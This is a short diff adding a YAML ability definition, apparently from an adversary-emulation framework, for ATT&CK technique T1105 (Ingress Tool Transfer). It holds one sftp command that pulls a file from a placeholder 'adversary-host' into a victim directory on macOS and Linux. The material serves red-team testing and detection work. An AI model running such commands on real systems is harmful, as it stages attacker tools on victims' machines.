@@ -1,0 +1,20 @@
+- description: 'Utilize sftp to perform a remote file copy (pull)
+
+    '
+  id: 44c7b6d3-c35f-ee09-a71b-5e23106a3f03
+  name: sftp remote file copy (pull)
+  platforms:
+    darwin:
+      sh:
+        cleanup: ''
+        command: sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/
+        payloads: []
+    linux:
+      sh:
+        cleanup: ''
+        command: sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/
+        payloads: []
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
